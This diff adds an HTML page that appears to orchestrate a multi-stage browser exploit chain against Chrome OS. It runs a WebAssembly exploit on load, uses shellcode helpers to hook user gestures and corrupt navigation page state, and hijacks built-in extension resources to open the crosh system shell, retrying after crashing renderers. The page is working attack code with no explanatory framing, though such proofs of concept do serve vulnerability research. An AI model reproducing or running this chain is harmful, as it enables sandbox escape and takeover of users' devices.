@@ -1,0 +1,206 @@
+<html>
+<head>
+</head>
+<body>
+<pre id="log" style="margin-bottom:0px"></pre>
+<pre id="log_drop" style="margin-top:0px"></pre>
+<script src="u64.js"></script>
+<script src="sym.js"></script>
+<script src="sc.js"></script>
+<script src="wasm_module.js"></script>
+<script src="wasm_xpl.js"></script>
+<script>
+
+at_bottom = true;
+window.onscroll = function(ev) {
+  at_bottom = window.innerHeight + window.scrollY >= document.body.offsetHeight;
+};
+
+run_wasm_exploit();
+
+function tobottom() {
+  window.scrollTo(0, document.body.scrollHeight);
+}
+function log(msg) {
+  var b = at_bottom;
+  document.getElementById('log').innerText += msg + '\n';
+  if (b) tobottom();
+}
+function log_drop(msg) {
+  var b = at_bottom;
+  document.getElementById('log_drop').innerText = msg;
+  if (b) tobottom();
+}
+
+function frame2_loaded(f) {
+  frame2_loaded = function() {};
+  log('frame2 loaded');
+  run_sc('find_frame2');
+  fr2 = f;
+  run_sc('hook_user_gesture');
+  window.open('chrome-extension://nkoccljplnhpfnfiajclkommnmllphnl/html/crosh.html', undefined, 'noopener');
+  start();
+}
+
+fr2_navigated_cb = undefined;
+function frame2_navigated() {
+  if (fr2_navigated_cb !== undefined)
+    fr2_navigated_cb();
+  else
+    log('frame2 navigated, no callback');
+}
+
+function war_frame(url, name, frame_ready) {
+  function expect_navigated(cb) {
+    fr2_navigated_cb = function() {
+      fr2_navigated_cb = undefined;
+      cb();
+    }
+  }
+  
+  function history_navigate(method, cb) {
+    expect_navigated(cb);
+    history[method]();
+  }
+
+  function back(cb) {
+    history_navigate('back', cb);
+  }
+
+  function forward(cb) {
+    history_navigate('forward', cb);
+  }
+
+  function nav_entry_id() {
+    return run_sc('get_nav_entry_id');
+  }
+
+  function make_dst_url() {
+    var need = ['u64.js', 'sym.js', 'sc.js', 'wasm_module.js', 'wasm_xpl.js', name + '.js'];
+    var html = '<html>';
+    for (var i = 0; i < need.length; i++)
+      html += '<' + 'script src="' + document.location.origin + '/' + need[i] + '"></' + 'script>'; // blah, vim gets confused
+    html += '</html>';
+    return 'data:text/html;charset=utf-8;base64,' + btoa(html);
+  }
+
+  function went_forward_by_sc() {
+    back(function() {
+      log('war ' + url + ' exploited');
+    });
+  }
+
+  function iframe_loaded() {
+    ifr.onload = undefined;
+    fr2.history.pushState({}, '');
+    back(function() {
+      var entry_id = nav_entry_id();
+      log('entry_id: ' + entry_id.val());
+      forward(function() {
+        expect_navigated(went_forward_by_sc);
+        var state_url = make_dst_url();
+        var war_frame = document.getElementsByTagName('iframe').length - 1;
+        run_sc('corrupt_war_page_state', war_frame, entry_id, state_url);
+      });
+    });
+  }
+
+  var msg_cb = undefined;
+  function recv_msg(e) {
+    if (e.source === ifr.contentWindow) {
+      if (e.data.cmd == 'ready') {
+        frame_ready();
+      } else if (event.data.cmd == 'callback') {
+        cb = msg_cb;
+        msg_cb = undefined;
+        cb(e.data);
+      } else if (event.data.cmd == 'log') {
+        log(name + ': ' + e.data.msg);
+      } else if (event.data.cmd == 'log_drop') {
+        log_drop(e.data.msg);
+      } else if (event.data.cmd == 'crosh_result') {
+        crosh_result(e.data.success);
+      }
+    }
+  }
+
+  function send_msg(cmd, data, cb) {
+    msg_cb = cb;
+    if (data === undefined)
+      data = {};
+    data.cmd = cmd;
+    ifr.contentWindow.postMessage(data, '*');
+  }
+
+  function make_renderers(count, cb) {
+    send_msg('make_renderers', {count: count}, cb);
+  }
+
+  function launch_crosh(origin, cb) {
+    send_msg('launch_crosh', {origin}, function(data) {
+      cb(data.success);
+    });
+  }
+
+  function crash() {
+    send_msg('crash', {});
+  }
+
+  function remove_frame() {
+    var iframes = document.getElementById('iframes');
+    iframes.removeChild(ifr);
+  }
+
+  function make_iframe() {
+    var iframes = document.getElementById('iframes');
+    var ifr = document.createElement('iframe');
+    ifr.onload = iframe_loaded;
+    ifr.src = url;
+    iframes.appendChild(ifr);
+    return ifr;
+  }
+
+  window.addEventListener('message', recv_msg, false);
+  var ifr = make_iframe();
+
+  return {
+    send_msg: send_msg,
+    make_renderers: make_renderers,
+    launch_crosh: launch_crosh,
+    crash: crash,
+    remove_frame: remove_frame};
+}
+
+function start() {
+  rendgen = war_frame(
+    'chrome-extension://pmfjbimdmchhbnneeidfognadeopoehp/image_loader_client.js',
+    'rendgen',
+    function() {
+      rendgen.make_renderers(20, launch_crosher);
+    });
+}
+
+function launch_crosher() {
+  var crosher = war_frame(
+    'chrome-extension://mhjfbmdgcfjbbpaeojofohoefgiehjai/content_script.js',
+    'crosher',
+    function() {
+      crosher.launch_crosh(document.location.origin, function(success) {
+        if (!success) {
+          rendgen.remove_frame();
+          crosher.crash();
+          crosher.remove_frame();
+          setTimeout(function() {
+            start();
+          }, 1000);
+        }
+      });
+    });
+}
+
+</script>
+<div id="iframes">
+<iframe src="frame.html"></iframe>
+</div>
+</body>
+</html>
